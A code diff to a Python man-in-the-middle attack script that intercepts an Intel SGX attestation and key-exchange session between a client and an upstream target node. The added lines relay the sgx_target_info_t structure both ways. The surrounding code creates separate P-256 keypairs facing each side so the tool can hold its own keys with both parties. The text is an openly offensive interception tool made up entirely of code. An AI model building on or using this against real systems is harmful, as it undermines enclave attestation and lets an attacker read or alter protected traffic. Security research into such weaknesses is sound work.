@@ -14,6 +14,7 @@ import socket
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
+SGX_TARGET_INFO_SIZE = 512
 SGX_REPORT_SIZE = 432
 REPORT_DATA_OFFSET = 320
 REPORT_DATA_SIZE = 64
@@ -100,6 +101,13 @@ def handle_mitm_session(client_sock: socket.socket, client_addr, target_ip: str,
     try:
         server_sock.connect((target_ip, target_port))
         print(f"[MITM] Connected to upstream target node {target_ip}:{target_port}")
+        
+        # 0. Relay 512-byte sgx_target_info_t exchange in both directions
+        client_ti = recv_exact(client_sock, SGX_TARGET_INFO_SIZE)
+        server_sock.sendall(client_ti)
+        server_ti = recv_exact(server_sock, SGX_TARGET_INFO_SIZE)
+        client_sock.sendall(server_ti)
+        print(f"[MITM] Relayed sgx_target_info_t ({SGX_TARGET_INFO_SIZE} bytes) in both directions.")
 
         # Generate two independent valid NIST P-256 keypairs (one facing Client, one facing Server)
         mitm_priv_for_client = ec.generate_private_key(ec.SECP256R1())
